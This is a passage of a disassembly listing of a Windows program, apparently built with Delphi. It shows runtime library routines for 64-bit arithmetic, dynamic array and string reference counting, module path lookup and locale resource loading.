		mov	eax, ebx
		mov	edx, [esi]
		call	sub_404D28
		add	ebx, 4
		add	esi, 4
		dec	ebp
		jnz	short loc_4043D7
		jmp	short loc_4043FF
; ---------------------------------------------------------------------------

loc_4043EB:				; CODE XREF: sub_404314+35j
					; sub_404314+E9j
		mov	eax, ebx
		mov	edx, [esi]
		mov	ecx, edi
		call	sub_404760
		add	ebx, 4
		add	esi, 4
		dec	ebp
		jnz	short loc_4043EB

loc_4043FF:				; CODE XREF: sub_404314+58j
					; sub_404314+6Fj ...
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn	4
sub_404314	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404408	proc near		; CODE XREF: CODE:00415A73p
					; CODE:00415A91p ...
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	ebx, edx
		mov	esi, eax
		mov	eax, esi
		call	sub_403C24
		push	eax		; cbMultiByte
		mov	eax, esi
		call	sub_403E24
		mov	ecx, eax	; lpMultiByteStr
		mov	edx, edi
		dec	edx		; cchWideChar
		mov	eax, ebx
		call	sub_403AD4
		mov	word ptr [ebx+eax*2], 0
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_404408	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_404438	proc near		; DATA XREF: sub_404E74+2Fo
		mov	al, 11h
		jmp	sub_402608
sub_404438	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_404440	proc near		; CODE XREF: sub_412A50+43p
					; sub_412A50+5Dp

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	edx
		push	eax
		mov	eax, [esp+8+arg_4]
		mul	[esp+8+var_8]
		mov	ecx, eax
		mov	eax, [esp+8+var_4]
		mul	[esp+8+arg_0]
		add	ecx, eax
		mov	eax, [esp+8+var_8]
		mul	[esp+8+arg_0]
		add	edx, ecx
		pop	ecx
		pop	ecx
		retn	8
sub_404440	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================


sub_404464	proc near		; CODE XREF: sub_405F00+65p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebp
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		mov	ebx, [esp+10h+arg_0]
		mov	ecx, [esp+10h+arg_4]
		or	ecx, ecx
		jnz	short loc_40447E
		or	edx, edx
		jz	short loc_4044D6
		or	ebx, ebx
		jz	short loc_4044D6

loc_40447E:				; CODE XREF: sub_404464+10j
		or	edx, edx
		jns	short loc_40448C
		neg	edx
		neg	eax
		sbb	edx, 0
		or	edi, 1

loc_40448C:				; CODE XREF: sub_404464+1Cj
		or	ecx, ecx
		jns	short loc_40449A
		neg	ecx
		neg	ebx
		sbb	ecx, 0
		xor	edi, 1

loc_40449A:				; CODE XREF: sub_404464+2Aj
		mov	ebp, ecx
		mov	ecx, 40h
		push	edi
		xor	edi, edi
		xor	esi, esi

loc_4044A6:				; CODE XREF: sub_404464:loc_4044BDj
		shl	eax, 1
		rcl	edx, 1
		rcl	esi, 1
		rcl	edi, 1
		cmp	edi, ebp
		jb	short loc_4044BD
		ja	short loc_4044B8
		cmp	esi, ebx
		jb	short loc_4044BD

loc_4044B8:				; CODE XREF: sub_404464+4Ej
		sub	esi, ebx
		sbb	edi, ebp
		inc	eax

loc_4044BD:				; CODE XREF: sub_404464+4Cj
					; sub_404464+52j
		loop	loc_4044A6
		pop	ebx
		test	ebx, 1
		jz	short loc_4044CF
		neg	edx
		neg	eax
		sbb	edx, 0

loc_4044CF:				; CODE XREF: sub_404464+62j
					; sub_404464+76j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
; ---------------------------------------------------------------------------

loc_4044D6:				; CODE XREF: sub_404464+14j
					; sub_404464+18j
		div	ebx
		xor	edx, edx
		jmp	short loc_4044CF
sub_404464	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4044E0	proc near		; CODE XREF: sub_405F00+49p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	ebp
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		mov	ebx, [esp+10h+arg_0]
		mov	ecx, [esp+10h+arg_4]
		or	ecx, ecx
		jnz	short loc_4044FA
		or	edx, edx
		jz	short loc_404553
		or	ebx, ebx
		jz	short loc_404553

loc_4044FA:				; CODE XREF: sub_4044E0+10j
		or	edx, edx
		jns	short loc_404508
		neg	edx
		neg	eax
		sbb	edx, 0
		or	edi, 1

loc_404508:				; CODE XREF: sub_4044E0+1Cj
		or	ecx, ecx
		jns	short loc_404513
		neg	ecx
		neg	ebx
		sbb	ecx, 0

loc_404513:				; CODE XREF: sub_4044E0+2Aj
		mov	ebp, ecx
		mov	ecx, 40h
		push	edi
		xor	edi, edi
		xor	esi, esi

loc_40451F:				; CODE XREF: sub_4044E0:loc_404536j
		shl	eax, 1
		rcl	edx, 1
		rcl	esi, 1
		rcl	edi, 1
		cmp	edi, ebp
		jb	short loc_404536
		ja	short loc_404531
		cmp	esi, ebx
		jb	short loc_404536

loc_404531:				; CODE XREF: sub_4044E0+4Bj
		sub	esi, ebx
		sbb	edi, ebp
		inc	eax

loc_404536:				; CODE XREF: sub_4044E0+49j
					; sub_4044E0+4Fj
		loop	loc_40451F
		mov	eax, esi
		mov	edx, edi
		pop	ebx
		test	ebx, 1
		jz	short loc_40454C
		neg	edx
		neg	eax
		sbb	edx, 0

loc_40454C:				; CODE XREF: sub_4044E0+63j
					; sub_4044E0+78j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
; ---------------------------------------------------------------------------

loc_404553:				; CODE XREF: sub_4044E0+14j
					; sub_4044E0+18j
		div	ebx
		xchg	eax, edx
		xor	edx, edx
		jmp	short loc_40454C
sub_4044E0	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40455C	proc near		; CODE XREF: sub_404564p
					; sub_408628+E8p ...
		test	eax, eax
		jz	short locret_404563
		mov	eax, [eax-4]

locret_404563:				; CODE XREF: sub_40455C+2j
		retn
sub_40455C	endp


; =============== S U B	R O U T	I N E =======================================


sub_404564	proc near		; CODE XREF: sub_408888+342p
					; sub_408888+3B2p ...
		call	sub_40455C
		dec	eax
		retn
sub_404564	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40456C	proc near		; CODE XREF: sub_40458C+106p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_0]
		call	sub_404314
		pop	ebp
		retn	4
sub_40456C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40457C	proc near		; CODE XREF: sub_40458C+B0p
		jmp	sub_4040E8
sub_40457C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404584	proc near		; CODE XREF: sub_40458C+2Fp
		call	sub_404724
		retn
sub_404584	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40458C	proc near		; CODE XREF: sub_40458C+173p
					; sub_404718+5p

var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE0h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_8], ecx
		mov	esi, edx
		mov	[ebp+var_4], eax
		mov	ebx, [ebp+var_4]
		mov	ebx, [ebx]
		mov	eax, [ebp+arg_0]
		mov	edi, [eax]
		test	edi, edi
		jg	short loc_4045C5
		test	edi, edi
		jge	short loc_4045B6
		mov	al, 4
		call	sub_402608
; ---------------------------------------------------------------------------

loc_4045B6:				; CODE XREF: sub_40458C+21j
		mov	eax, [ebp+var_4]
		mov	edx, esi
		call	sub_404584
		jmp	loc_40470F
; ---------------------------------------------------------------------------

loc_4045C5:				; CODE XREF: sub_40458C+1Dj
		xor	eax, eax
		mov	[ebp+var_10], eax
		test	ebx, ebx
		jz	short loc_4045D9
		sub	ebx, 4
		mov	eax, [ebx]
		mov	[ebp+var_10], eax
		sub	ebx, 4

loc_4045D9:				; CODE XREF: sub_40458C+40j
		xor	eax, eax
		mov	al, [esi+1]
		add	esi, eax
		mov	eax, esi
		mov	edx, [eax+2]
		mov	[ebp+var_18], edx
		mov	edx, [eax+6]
		test	edx, edx
		jz	short loc_4045F3
		mov	esi, [edx]
		jmp	short loc_4045F5
; ---------------------------------------------------------------------------

loc_4045F3:				; CODE XREF: sub_40458C+61j
		xor	esi, esi

loc_4045F5:				; CODE XREF: sub_40458C+65j
		mov	eax, edi
		imul	[ebp+var_18]
		mov	[ebp+var_1C], eax
		mov	eax, [ebp+var_1C]
		cdq
		idiv	edi
		cmp	eax, [ebp+var_18]
		jz	short loc_40460F
		mov	al, 4
		call	sub_402608
; ---------------------------------------------------------------------------

loc_40460F:				; CODE XREF: sub_40458C+7Aj
		add	[ebp+var_1C], 8
		test	ebx, ebx
		jz	short loc_40461C
		cmp	dword ptr [ebx], 1
		jnz	short loc_404651

loc_40461C:				; CODE XREF: sub_40458C+89j
		mov	[ebp+var_20], ebx
		cmp	edi, [ebp+var_10]
		jge	short loc_404641
		test	esi, esi
		jz	short loc_404641
		mov	eax, ebx
		add	eax, 8
		mov	edx, edi
		imul	edx, [ebp+var_18]
		add	eax, edx
		mov	ecx, [ebp+var_10]
		sub	ecx, edi
		mov	edx, esi
		call	sub_40457C

loc_404641:				; CODE XREF: sub_40458C+96j
					; sub_40458C+9Aj
		lea	eax, [ebp+var_20]
		mov	edx, [ebp+var_1C]
		call	sub_402560
		mov	ebx, [ebp+var_20]
		jmp	short loc_4046AF
; ---------------------------------------------------------------------------

loc_404651:				; CODE XREF: sub_40458C+8Ej
		dec	dword ptr [ebx]
		mov	eax, [ebp+var_1C]
		call	sub_402520
		mov	ebx, eax
		mov	eax, [ebp+var_10]
		mov	[ebp+var_14], eax
		cmp	edi, [ebp+var_14]
		jge	short loc_40466B
		mov	[ebp+var_14], edi

loc_40466B:				; CODE XREF: sub_40458C+DAj
		test	esi, esi
		jz	short loc_404699
		mov	edx, [ebp+var_14]
		imul	edx, [ebp+var_18]
		mov	eax, ebx
		add	eax, 8
		xor	ecx, ecx
		call	sub_4027C0
		mov	eax, [ebp+var_14]
		push	eax
		mov	edx, [ebp+var_4]
		mov	edx, [edx]
		mov	eax, ebx
		add	eax, 8
		mov	ecx, esi
		call	sub_40456C
		jmp	short loc_4046AF
; ---------------------------------------------------------------------------

loc_404699:				; CODE XREF: sub_40458C+E1j
		mov	ecx, [ebp+var_14]
		imul	ecx, [ebp+var_18]
		mov	edx, ebx
		add	edx, 8
		mov	eax, [ebp+var_4]
		mov	eax, [eax]
		call	sub_402664

loc_4046AF:				; CODE XREF: sub_40458C+C3j
					; sub_40458C+10Bj
		mov	dword ptr [ebx], 1
		add	ebx, 4
		mov	[ebx], edi
		add	ebx, 4
		mov	edx, edi
		sub	edx, [ebp+var_10]
		imul	edx, [ebp+var_18]
		mov	eax, [ebp+var_18]
		imul	eax, [ebp+var_10]
		add	eax, ebx
		xor	ecx, ecx
		call	sub_4027C0
		cmp	[ebp+var_8], 1
		jle	short loc_40470A
		add	[ebp+arg_0], 4
		dec	[ebp+var_8]
		dec	edi
		test	edi, edi
		jl	short loc_40470A
		inc	edi
		mov	[ebp+var_C], 0

loc_4046F0:				; CODE XREF: sub_40458C+17Cj
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_C]
		lea	eax, [ebx+eax*4]
		mov	ecx, [ebp+var_8]
		mov	edx, esi
		call	sub_40458C
		inc	[ebp+var_C]
		dec	edi
		jnz	short loc_4046F0

loc_40470A:				; CODE XREF: sub_40458C+14Ej
					; sub_40458C+15Aj
		mov	eax, [ebp+var_4]
		mov	[eax], ebx

loc_40470F:				; CODE XREF: sub_40458C+34j
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40458C	endp


; =============== S U B	R O U T	I N E =======================================


sub_404718	proc near		; CODE XREF: sub_408628+117p
					; sub_408628+146p ...

var_4		= dword	ptr -4

		push	esp
		add	[esp+4+var_4], 4
		call	sub_40458C
		retn
sub_404718	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404724	proc near		; CODE XREF: sub_4040E8+D0p
					; sub_404584p ...
		mov	ecx, [eax]
		test	ecx, ecx
		jz	short locret_40475D
		mov	dword ptr [eax], 0
		lock dec dword ptr [ecx-8]
		jnz	short locret_40475D
		push	eax
		mov	eax, ecx
		xor	ecx, ecx
		mov	cl, [edx+1]
		mov	edx, [ecx+edx+6]
		test	edx, edx
		jz	short loc_404754
		mov	ecx, [eax-4]
		test	ecx, ecx
		jz	short loc_404754
		mov	edx, [edx]
		call	sub_4040E8

loc_404754:				; CODE XREF: sub_404724+20j
					; sub_404724+27j
		sub	eax, 8
		call	sub_402540
		pop	eax

locret_40475D:				; CODE XREF: sub_404724+4j
					; sub_404724+10j
		retn
sub_404724	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_404760	proc near		; CODE XREF: sub_4041F8+EFp
					; sub_404314+DDp
		push	ebx
		mov	ebx, [eax]
		test	edx, edx
		jz	short loc_40476B
		lock inc dword ptr [edx-8]

loc_40476B:				; CODE XREF: sub_404760+5j
		test	ebx, ebx
		jz	short loc_404783
		lock dec dword ptr [ebx-8]
		jnz	short loc_404783
		push	eax
		push	edx
		mov	edx, ecx
		inc	dword ptr [ebx-8]
		call	sub_404724
		pop	edx
		pop	eax

loc_404783:				; CODE XREF: sub_404760+Dj
					; sub_404760+13j
		mov	[eax], edx
		pop	ebx
		retn
sub_404760	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_404788	proc near		; CODE XREF: sub_4047D0+1Bp

Filename	= byte ptr -110h

		push	ebx
		push	esi
		add	esp, 0FFFFFEF8h
		mov	ebx, eax
		cmp	dword ptr [ebx+10h], 0
		jnz	short loc_4047C3
		push	105h		; nSize
		lea	eax, [esp+114h+Filename]
		push	eax		; lpFilename
		mov	eax, [ebx+4]
		push	eax		; hModule
		call	GetModuleFileNameA
		mov	eax, esp
		mov	dl, 1
		call	sub_4049C4
		mov	esi, eax
		mov	[ebx+10h], esi
		test	esi, esi
		jnz	short loc_4047C3
		mov	eax, [ebx+4]
		mov	[ebx+10h], eax

loc_4047C3:				; CODE XREF: sub_404788+Ej
					; sub_404788+33j
		mov	eax, [ebx+10h]
		add	esp, 108h
		pop	esi
		pop	ebx
		retn
sub_404788	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_4047D0	proc near		; CODE XREF: sub_404D54+2Bp
					; sub_413B60+ECp ...
		mov	edx, ds:dword_416028
		test	edx, edx
		jz	short locret_4047F7

loc_4047DA:				; CODE XREF: sub_4047D0+25j
		cmp	eax, [edx+4]
		jz	short loc_4047E9
		cmp	eax, [edx+8]
		jz	short loc_4047E9
		cmp	eax, [edx+0Ch]
		jnz	short loc_4047F1

loc_4047E9:				; CODE XREF: sub_4047D0+Dj
					; sub_4047D0+12j
		mov	eax, edx
		call	sub_404788
		retn
; ---------------------------------------------------------------------------

loc_4047F1:				; CODE XREF: sub_4047D0+17j
		mov	edx, [edx]
		test	edx, edx
		jnz	short loc_4047DA

locret_4047F7:				; CODE XREF: sub_4047D0+8j
		retn
sub_4047D0	endp


; =============== S U B	R O U T	I N E =======================================


sub_4047F8	proc near		; CODE XREF: sub_40480C+83p
					; sub_40480C+96p ...
		jmp	short loc_404800
; ---------------------------------------------------------------------------

loc_4047FA:				; CODE XREF: sub_4047F8+11j
		push	eax		; lpsz
		call	CharNextA

loc_404800:				; CODE XREF: sub_4047F8j
		mov	dl, [eax]
		test	dl, dl
		jz	short locret_40480B
		cmp	dl, 5Ch
		jnz	short loc_4047FA

locret_40480B:				; CODE XREF: sub_4047F8+Cj
		retn
sub_4047F8	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40480C	proc near		; CODE XREF: sub_4049C4+A3p

String1		= byte ptr -24Fh
FindFileData	= _WIN32_FIND_DATAA ptr	-14Ah
iMaxLength	= dword	ptr -8
lpString2	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFDB0h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+iMaxLength], edx
		mov	[ebp+lpString2], eax
		mov	eax, [ebp+lpString2]
		mov	dword ptr [ebp+FindFileData._padding], eax
		push	offset ModuleName ; "kernel32.dll"
		call	GetModuleHandleA
		mov	esi, eax
		test	esi, esi
		jz	short loc_404874
		push	offset ProcName	; "GetLongPathNameA"
		push	esi		; hModule
		call	GetProcAddress
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_404874
		push	105h
		lea	eax, [ebp+String1]
		push	eax
		mov	eax, [ebp+lpString2]
		push	eax
		call	ebx
		test	eax, eax
		jz	short loc_404874
		mov	eax, [ebp+iMaxLength]
		push	eax		; iMaxLength
		lea	eax, [ebp+String1]
		push	eax		; lpString2
		mov	eax, [ebp+lpString2]
		push	eax		; lpString1
		call	lstrcpynA
		jmp	loc_404996
; ---------------------------------------------------------------------------

loc_404874:				; CODE XREF: sub_40480C+26j
					; sub_40480C+37j ...
		mov	eax, [ebp+lpString2]
		cmp	byte ptr [eax],	5Ch
		jnz	short loc_4048B4
		mov	eax, [ebp+lpString2]
		cmp	byte ptr [eax+1], 5Ch
		jnz	loc_404996
		mov	eax, [ebp+lpString2]
		add	eax, 2
		call	sub_4047F8
		mov	esi, eax
		cmp	byte ptr [esi],	0
		jz	loc_404996
		lea	eax, [esi+1]
		call	sub_4047F8
		mov	esi, eax
		cmp	byte ptr [esi],	0
		jz	loc_404996
		jmp	short loc_4048BA
; ---------------------------------------------------------------------------

loc_4048B4:				; CODE XREF: sub_40480C+6Ej
		mov	esi, [ebp+lpString2]
		add	esi, 2

loc_4048BA:				; CODE XREF: sub_40480C+A6j
		mov	ebx, esi
		sub	ebx, [ebp+lpString2]
		lea	eax, [ebx+1]
		push	eax		; iMaxLength
		mov	eax, [ebp+lpString2]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		call	lstrcpynA
		jmp	loc_404979
; ---------------------------------------------------------------------------

loc_4048D8:				; CODE XREF: sub_40480C+170j
		lea	eax, [esi+1]
		call	sub_4047F8
		mov	edi, eax
		mov	eax, edi
		sub	eax, esi
		mov	edx, eax
		add	edx, ebx
		inc	edx
		cmp	edx, 105h
		jg	loc_404996
		inc	eax
		push	eax		; iMaxLength
		push	esi		; lpString2
		lea	eax, [ebp+String1]
		add	eax, ebx
		push	eax		; lpString1
		call	lstrcpynA
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		lea	eax, [ebp+String1]
		push	eax		; lpFileName
		call	FindFirstFileA
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jz	short loc_404996
		push	esi		; hFindFile
		call	FindClose
		lea	eax, [ebp+FindFileData.cFileName]
		push	eax		; lpString
		call	lstrlenA
		lea	edx, [ebx+1]
		add	eax, edx
		inc	eax
		cmp	eax, 105h
		jg	short loc_404996
		mov	[ebp+ebx+String1], 5Ch
		mov	eax, 105h
		sub	eax, ebx
		dec	eax
		push	eax		; iMaxLength
		lea	eax, [ebp+FindFileData.cFileName]
		push	eax		; lpString2
		lea	eax, [ebp+String1]
		add	eax, ebx
		inc	eax
		push	eax		; lpString1
		call	lstrcpynA
		lea	eax, [ebp+FindFileData.cFileName]
		push	eax		; lpString
		call	lstrlenA
		inc	eax
		add	ebx, eax
		mov	esi, edi

loc_404979:				; CODE XREF: sub_40480C+C7j
		cmp	byte ptr [esi],	0
		jnz	loc_4048D8
		mov	eax, [ebp+iMaxLength]
		push	eax		; iMaxLength
		lea	eax, [ebp+String1]
		push	eax		; lpString2
		mov	eax, [ebp+lpString2]
		push	eax		; lpString1
		call	lstrcpynA

loc_404996:				; CODE XREF: sub_40480C+63j
					; sub_40480C+77j ...
		mov	eax, dword ptr [ebp+FindFileData._padding]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40480C	endp

; ---------------------------------------------------------------------------
; char ModuleName[13]
ModuleName	db 'kernel32.dll',0     ; DATA XREF: sub_40480C+18o
		align 10h
; char ProcName[]
ProcName	db 'GetLongPathNameA',0 ; DATA XREF: sub_40480C+28o
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4049C4	proc near		; CODE XREF: sub_404788+27p

ValueName	= byte ptr -11Dh
cbData		= dword	ptr -18h
String2		= byte ptr -12h
var_E		= byte ptr -0Eh
LCData		= byte ptr -0Dh
var_B		= byte ptr -0Bh
hKey		= dword	ptr -8
lpString2	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFEE0h
		push	ebx
		push	esi
		mov	[ebp+lpString2], eax
		push	105h		; nSize
		lea	eax, [ebp+ValueName]
		push	eax		; lpFilename
		push	0		; hModule
		call	GetModuleFileNameA
		mov	[ebp+String2], 0
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	0F0019h		; samDesired
		push	0		; ulOptions
		push	offset SubKey	; "Software\\BorlandO"
		push	80000001h	; hKey
		call	RegOpenKeyExA
		test	eax, eax
		jz	short loc_404A47
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	0F0019h		; samDesired
		push	0		; ulOptions
		push	offset SubKey	; "Software\\BorlandO"
		push	80000002h	; hKey
		call	RegOpenKeyExA
		test	eax, eax
		jz	short loc_404A47
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	0F0019h		; samDesired
		push	0		; ulOptions
		push	offset aSoftwareBorl_0 ; "Software\\Borland\\Delphi\\Locales"
		push	80000001h	; hKey
		call	RegOpenKeyExA
		test	eax, eax
		jnz	loc_404AD0

loc_404A47:				; CODE XREF: sub_4049C4+41j
					; sub_4049C4+5Fj
		xor	eax, eax
		push	ebp
		push	offset loc_404AC9
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+cbData], 5
		lea	eax, [ebp+ValueName]
		mov	edx, 105h
		call	sub_40480C
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+String2]
		push	eax		; lpData
		push	0		; lpType
		push	0		; lpReserved
		lea	eax, [ebp+ValueName]
		push	eax		; lpValueName
		mov	eax, [ebp+hKey]
		push	eax		; hKey
		call	RegQueryValueExA
		test	eax, eax
		jz	short loc_404AAE
		lea	eax, [ebp+cbData]
		push	eax		; lpcbData
		lea	eax, [ebp+String2]
		push	eax		; lpData
		push	0		; lpType
		push	0		; lpReserved
		push	offset ValueName ; lpValueName
		mov	eax, [ebp+hKey]
		push	eax		; hKey
		call	RegQueryValueExA
		test	eax, eax
		jz	short loc_404AAE
		mov	[ebp+String2], 0

loc_404AAE:				; CODE XREF: sub_4049C4+C6j
					; sub_4049C4+E4j
		mov	[ebp+var_E], 0
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_404AD0

loc_404ABF:				; CODE XREF: sub_4049C4+10Aj
		mov	eax, [ebp+hKey]
		push	eax		; hKey
		call	RegCloseKey
		retn
; ---------------------------------------------------------------------------

loc_404AC9:				; DATA XREF: sub_4049C4+86o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_404ABF
; ---------------------------------------------------------------------------

loc_404AD0:				; CODE XREF: sub_4049C4+7Dj
					; sub_4049C4+104j
					; DATA XREF: ...
		push	105h		; iMaxLength
		mov	eax, [ebp+lpString2]
		push	eax		; lpString2
		lea	eax, [ebp+ValueName]
		push	eax		; lpString1
		call	lstrcpynA
		push	5		; cchData
		lea	eax, [ebp+LCData]
		push	eax		; lpLCData
		push	3		; LCType
		call	GetThreadLocale
		push	eax		; Locale
		call	GetLocaleInfoA
		xor	esi, esi
		cmp	[ebp+ValueName], 0
		jz	loc_404BEA
		cmp	[ebp+LCData], 0
		jnz	short loc_404B17
		cmp	[ebp+String2], 0
		jz	loc_404BEA

loc_404B17:				; CODE XREF: sub_4049C4+147j
		lea	eax, [ebp+ValueName]
		push	eax		; lpString
		call	lstrlenA
		mov	ebx, eax
		lea	eax, [ebp+ValueName]
		add	ebx, eax
		jmp	short loc_404B30
; ---------------------------------------------------------------------------

loc_404B2F:				; CODE XREF: sub_4049C4+179j
		dec	ebx

loc_404B30:				; CODE XREF: sub_4049C4+169j
		cmp	byte ptr [ebx],	2Eh
		jz	short loc_404B3F
		lea	eax, [ebp+ValueName]
		cmp	ebx, eax
		jnz	short loc_404B2F

loc_404B3F:				; CODE XREF: sub_4049C4+16Fj
		lea	eax, [ebp+ValueName]
		cmp	ebx, eax
		jz	loc_404BEA
		inc	ebx
		cmp	[ebp+String2], 0
		jz	short loc_404B7C
		mov	edx, ebx
		sub	edx, eax
		mov	eax, 105h
		sub	eax, edx
		push	eax		; iMaxLength
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		push	ebx		; lpString1
		call	lstrcpynA
		push	2		; dwFlags
		push	0		; hFile
		lea	eax, [ebp+ValueName]
		push	eax		; lpLibFileName
		call	LoadLibraryExA
		mov	esi, eax

loc_404B7C:				; CODE XREF: sub_4049C4+18Ej
		test	esi, esi
		jnz	short loc_404BEA
		cmp	[ebp+LCData], 0
		jz	short loc_404BEA
		lea	eax, [ebp+ValueName]
		mov	edx, ebx
		sub	edx, eax
		mov	eax, 105h
		sub	eax, edx
		push	eax		; iMaxLength
		lea	eax, [ebp+LCData]
		push	eax		; lpString2
		push	ebx		; lpString1
		call	lstrcpynA
		push	2		; dwFlags
		push	0		; hFile
		lea	eax, [ebp+ValueName]
		push	eax		; lpLibFileName
		call	LoadLibraryExA
		mov	esi, eax
		test	esi, esi
		jnz	short loc_404BEA
		mov	[ebp+var_B], 0
		lea	eax, [ebp+ValueName]
		mov	edx, ebx
		sub	edx, eax
		mov	eax, 105h
		sub	eax, edx
		push	eax		; iMaxLength
		lea	eax, [ebp+LCData]
		push	eax		; lpString2
		push	ebx		; lpString1
		call	lstrcpynA
		push	2		; dwFlags
		push	0		; hFile
		lea	eax, [ebp+ValueName]
		push	eax		; lpLibFileName
		call	LoadLibraryExA
		mov	esi, eax

loc_404BEA:				; CODE XREF: sub_4049C4+13Dj
					; sub_4049C4+14Dj ...
		mov	eax, esi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4049C4	endp

; ---------------------------------------------------------------------------
		align 4
; char SubKey[]
SubKey		db 'Software\BorlandO' ; DATA XREF: sub_4049C4+30o
					; sub_4049C4+4Eo
		db 1
		dd 73659000h, 0
; char aSoftwareBorl_0[]
aSoftwareBorl_0	db 'Software\Borland\Delphi\Locales',0 ; DATA XREF: sub_4049C4+6Co
; char ValueName[4]
ValueName	db 4 dup(0)		; DATA XREF: sub_4049C4+D4o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404C34	proc near		; CODE XREF: sub_404CA0+1Bp

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], eax
		mov	eax, ds:dword_41602C
		mov	[ebp+var_8], eax
		cmp	[ebp+var_8], 0
		jz	short loc_404C87

loc_404C4E:				; CODE XREF: sub_404C34+51j
		xor	eax, eax
		push	ebp
		push	offset loc_404C6F
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	ebx, [ebp+var_8]
		mov	eax, [ebp+var_4]
		call	dword ptr [ebx+4]
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_404C79
; ---------------------------------------------------------------------------

loc_404C6F:				; DATA XREF: sub_404C34+1Do
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_404C79:				; CODE XREF: sub_404C34+39j
		mov	eax, [ebp+var_8]
		mov	eax, [eax]
		mov	[ebp+var_8], eax
		cmp	[ebp+var_8], 0
		jnz	short loc_404C4E

loc_404C87:				; CODE XREF: sub_404C34+18j
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_404C34	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_404C90	proc near		; CODE XREF: sub_405088+5p
		mov	edx, ds:dword_416028
		mov	[eax], edx
		mov	ds:dword_416028, eax
		retn
sub_404C90	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_404CA0	proc near		; CODE XREF: sub_4038A4+70p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	[ebp+var_4], eax
		xor	edx, edx
		push	ebp
		push	offset loc_404D04
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, [ebp+var_4]
		mov	eax, [eax+4]
		call	sub_404C34
		xor	eax, eax
		pop	edx
